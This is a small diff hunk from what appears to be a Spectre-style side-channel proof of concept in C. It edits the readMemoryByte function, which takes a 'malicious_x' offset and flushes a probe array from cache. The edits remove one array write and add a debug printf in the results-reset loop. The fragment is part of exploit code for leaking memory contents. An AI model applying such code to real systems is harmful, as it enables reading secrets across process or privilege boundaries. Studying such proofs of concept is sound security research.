@@ -60,13 +60,14 @@ void readMemoryByte(size_t malicious_x, uint8_t value[3], int score[3]) {
   uint8_t data = 0;
   size_t training_x, x;
   register uint64_t time1, time2;
-  bigArray[4096] = 'h';
 
 
-  for (i = 0; i < 256; i++)
-    results[i] = 0;
-  for (tries = 999; tries > 0; tries--) {
+  for (i = 0; i < 256; i++) {
       printf("try %d", i);
+      results[i] = 0;
+  }
+    
+  for (tries = 999; tries > 0; tries--) {
     results[0] = 0;
     /* Flush big array[4096*(0..255)] from cache */
     for (i = 0; i < 4096; i++)
